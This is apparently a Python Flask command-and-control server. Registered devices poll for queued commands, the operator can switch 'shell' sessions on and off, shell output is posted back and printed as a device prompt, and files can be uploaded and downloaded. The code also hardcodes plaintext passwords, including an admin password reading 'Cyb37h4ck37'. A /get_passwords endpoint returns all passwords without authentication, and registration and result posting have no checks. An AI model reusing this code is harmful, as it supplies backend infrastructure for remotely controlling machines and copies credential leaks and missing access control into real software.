from flask import Flask, request, jsonify, send_from_directory
import os
import time
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Ensure the upload folder exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# In-memory storage (use a database for production)
devices = {}  # device_id: {device_name, owner_token, last_seen}
commands = {}  # device_id: list of commands
shell_sessions = {}  # device_id: shell active or not
passwords = {
    "user": "user123",
    "admin": "Cyb37h4ck37"
}

# Helper function to check allowed file extensions
def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# Device registration
@app.route('/register_device', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    device_name = data.get('device_name')
    owner_token = data.get('owner_token')

    if not all([device_id, device_name, owner_token]):
        return jsonify({'status': 'error', 'message': 'Missing fields'}), 400

    devices[device_id] = {
        'device_name': device_name,
        'owner_token': owner_token,
        'last_seen': time.time()
    }
    commands[device_id] = []
    shell_sessions[device_id] = False
    return jsonify({'status': 'success', 'message': 'Registered'}), 200

# Heartbeat
@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    device_id = data.get('device_id')
    if device_id in devices:
        devices[device_id]['last_seen'] = time.time()
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Device not found'}), 404

# Get passwords
@app.route('/get_passwords', methods=['GET'])
def get_passwords():
    return jsonify(passwords)

# Set passwords (admin only)
@app.route('/set_passwords', methods=['POST'])
def set_passwords():
    data = request.json
    admin_pass = data.get('admin_pass')
    new_user = data.get('user')
    new_admin = data.get('admin')

    if admin_pass != passwords['admin']:
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403

    if new_user:
        passwords['user'] = new_user
    if new_admin:
        passwords['admin'] = new_admin

    return jsonify({'status': 'success', 'message': 'Passwords updated'})

# Send command
@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    owner_token = data.get('owner_token')
    command = data.get('command')

    if device_id not in devices or devices[device_id]['owner_token'] != owner_token:
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403

    if command == "start_shell":
        shell_sessions[device_id] = True
        return jsonify({'status': 'shell started'})

    elif command == "exit":
        shell_sessions[device_id] = False
        return jsonify({'status': 'shell ended'})

    elif shell_sessions.get(device_id):
        commands[device_id].append(command)
        return jsonify({'status': 'queued in shell'})

    else:
        commands[device_id].append(command)
        return jsonify({'status': 'queued'})

# Get commands
@app.route('/get_commands', methods=['POST'])
def get_commands():
    data = request.json
    device_id = data.get('device_id')

    if device_id not in commands:
        return jsonify({'status': 'error', 'message': 'Device not found'}), 404

    queued = commands[device_id]
    commands[device_id] = []
    return jsonify({'status': 'success', 'commands': queued})

# Post result (shell output)
@app.route('/post_result', methods=['POST'])
def post_result():
    data = request.json
    device_id = data.get('device_id')
    output = data.get('output')

    if device_id not in devices:
        return jsonify({'status': 'error', 'message': 'Device not found'}), 404

    # Format output to mimic shell
    formatted_output = f"{devices[device_id]['device_name']}@device:~$ {output}"
    # Here you would typically store or forward the output
    print(formatted_output)  # For demonstration purposes

    return jsonify({'status': 'success'})

# Upload file
@app.route('/upload_file', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        return jsonify({'status': 'success', 'message': 'File uploaded'}), 200
    else:
        return jsonify({'status': 'error', 'message': 'File type not allowed'}), 400

# Download file
@app.route('/download_file/<filename>', methods=['GET'])
def download_file(filename):
    try:
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)
    except FileNotFoundError:
        return jsonify({'status': 'error', 'message': 'File not found'}), 404

# Get devices
@app.route('/get_devices', methods=['POST'])
def get_devices():
    data = request.json
    owner_token = data.get('owner_token')

    if not owner_token:
        return jsonify({'status': 'error', 'message': 'Missing owner token'}), 400

    now = time.time()
    result = []
    for dev_id, info in devices.items():
        if info['owner_token'] == owner_token:
            result.append({
                'device_id': dev_id,
                'device_name': info['device_name'],
                'status': 'online' if now - info.get('last_seen', 0) < 60 else 'offline'
            })

    return jsonify({'status': 'success', 'devices': result})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
